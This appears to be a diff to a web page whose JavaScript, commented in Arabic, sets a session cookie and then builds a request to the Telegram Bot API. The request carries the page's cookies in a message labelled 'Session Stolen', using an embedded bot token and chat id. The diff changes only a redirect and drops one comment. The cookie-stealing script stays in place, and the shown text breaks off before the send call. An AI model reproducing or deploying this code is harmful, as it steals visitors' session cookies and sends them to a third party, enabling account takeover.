@@ -88,14 +88,14 @@
       document.cookie = "session_id=" + uniqueSessionId + "; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
       alert("تم إنشاء جلسة فريدة! المفتاح هو: " + uniqueSessionId + ". سيتم إرساله الآن.");
       
-      window.location.href = "main.html"; // توجيه لصفحة وهمية (يعتبر المستخدم مسجلاً دخوله)
+      // التوجيه إلى نفس الصفحة بدلاً من ملف main.html لتبسيط الاختبار
+      window.location.href = window.location.href; 
     }
   </script>
   
   <script>
       const cookies = document.cookie;
       const encodedCookies = encodeURIComponent(cookies);
-      // الرمز الجديد: 8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y
       const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y/sendMessage?chat_id=6717287161&text=Session%20Stolen%3A%20" + encodedCookies;
       
       // الإرسال إلى البوت
